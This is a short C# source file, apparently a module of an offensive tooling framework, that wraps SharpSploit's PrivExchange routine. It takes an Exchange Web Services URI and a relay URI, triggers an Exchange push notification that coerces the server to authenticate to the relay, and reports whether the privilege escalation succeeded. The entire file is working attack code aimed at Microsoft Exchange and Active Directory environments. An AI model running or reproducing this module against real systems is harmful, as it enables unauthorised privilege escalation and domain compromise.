using System;
  
using SharpSploit.PrivilegeEscalation;

namespace ExecSploit
{
    public static class PrivExchange
    {
        public static string Execute(string EWSUri, string RelayUri, string ExchangeVersion = "Exchange2010")
        {
            Exchange.ExchangeVersion version = (Exchange.ExchangeVersion)Enum.Parse(typeof(Exchange.ExchangeVersion), ExchangeVersion, true);
            if (Exchange.PrivExchangePushNotification(EWSUri, RelayUri, version))
            {
                return "PrivExchange succeeded!";
            }
            return "PrivExchange failed.";
        }
    }
}